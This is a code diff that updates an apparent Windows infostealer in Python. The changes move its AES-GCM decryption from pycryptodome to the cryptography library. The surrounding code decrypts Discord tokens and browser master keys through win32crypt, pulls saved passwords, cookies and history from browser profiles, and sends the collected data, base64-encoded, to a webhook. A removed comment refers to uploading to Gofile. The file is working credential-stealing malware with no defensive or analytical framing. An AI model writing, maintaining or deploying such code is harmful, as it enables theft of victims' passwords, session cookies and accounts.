@@ -6,7 +6,8 @@ if os.name != "nt":
     sys.exit(0)
 else:
     import win32crypt
-    from Crypto.Cipher import AES
+    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+    from cryptography.hazmat.backends import default_backend
     import win32api
     import win32con
 
@@ -241,8 +242,16 @@ def decrypt_token(encrypted_token, key):
     try:
         encrypted = base64.b64decode(encrypted_token.split('dQw4w9WgXcQ:')[1])
         decrypted_key = win32crypt.CryptUnprotectData(base64.b64decode(key)[5:], None, None, None, 0)[1]
-        cipher = AES.new(decrypted_key, AES.MODE_GCM, encrypted[3:15])
-        return cipher.decrypt(encrypted[15:])[:-16].decode()
+        
+        # Using cryptography instead of pycryptodome
+        iv = encrypted[3:15]
+        ciphertext = encrypted[15:-16]
+        tag = encrypted[-16:]
+        
+        cipher = Cipher(algorithms.AES(decrypted_key), modes.GCM(iv, tag), backend=default_backend())
+        decryptor = cipher.decryptor()
+        decrypted = decryptor.update(ciphertext) + decryptor.finalize()
+        return decrypted.decode('utf-8')
     except:
         return None
 
@@ -265,10 +274,15 @@ def get_browser_master_key(path):
 
 def decrypt_browser_data(buff, master_key):
     try:
+        # Using cryptography instead of pycryptodome
         iv = buff[3:15]
-        payload = buff[15:]
-        cipher = AES.new(master_key, AES.MODE_GCM, iv)
-        return cipher.decrypt(payload)[:-16].decode()
+        ciphertext = buff[15:-16]
+        tag = buff[-16:]
+        
+        cipher = Cipher(algorithms.AES(master_key), modes.GCM(iv, tag), backend=default_backend())
+        decryptor = cipher.decryptor()
+        decrypted = decryptor.update(ciphertext) + decryptor.finalize()
+        return decrypted.decode('utf-8')
     except:
         return ""
 
@@ -287,7 +301,7 @@ def extract_browser_data():
         for profile in PROFILES:
             profile_path = path if name in ['opera', 'opera-gx'] else os.path.join(path, profile)
             
-            # Passwords
+            # passwords
             try:
                 login_db = os.path.join(profile_path, 'Login Data')
                 if os.path.exists(login_db):
@@ -310,7 +324,7 @@ def extract_browser_data():
             except:
                 pass
             
-            # Cookies
+            # cookies
             try:
                 cookie_db = os.path.join(profile_path, 'Network', 'Cookies')
                 if os.path.exists(cookie_db):
@@ -332,7 +346,7 @@ def extract_browser_data():
             except:
                 pass
             
-            # History
+            # history
             try:
                 history_db = os.path.join(profile_path, 'History')
                 if os.path.exists(history_db):
@@ -373,8 +387,6 @@ def extract_browser_data():
 
 def send_webhook(data, hostname):
     try:
-        # Format: {hostname} @everyone
-        # `{base64 encoded json}`
         json_str = json.dumps(data)
         encoded = base64.b64encode(json_str.encode()).decode()
         
@@ -405,7 +417,7 @@ def main():
     
     hostname = os.getenv("COMPUTERNAME", "UNKNOWN_PC")
     
-    # Get Discord tokens
+    # get tokens
     for platform, path in PATHS.items():
         if not os.path.exists(path):
             continue
@@ -444,10 +456,8 @@ def main():
             except:
                 continue
     
-    # Get browser data and upload to Gofile
     results["browser_data"] = extract_browser_data()
     
-    # Send webhook
     send_webhook(results, hostname)
     
     try:
